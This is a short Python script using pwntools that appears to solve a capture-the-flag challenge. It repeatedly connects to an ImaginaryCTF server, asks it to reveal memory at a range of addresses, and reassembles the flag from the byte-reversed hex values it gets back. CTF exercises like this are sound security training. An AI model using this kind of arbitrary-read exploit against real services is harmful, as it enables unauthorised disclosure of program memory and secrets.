from pwn import remote


flag = ""
for addr in range(0x404080, 0x404100, 8):
    addr = hex(addr)[2:]
    r = remote("puzzler7.imaginaryctf.org", 5000)
    r.recvuntil(b">>> ")
    r.sendline(addr.encode())
    r.recvuntil(b": ")
    val = bytes.fromhex(r.recvline().decode()).decode()[::-1]
    r.close()
    if "\x00" in val:
        break
    flag += val
print(flag)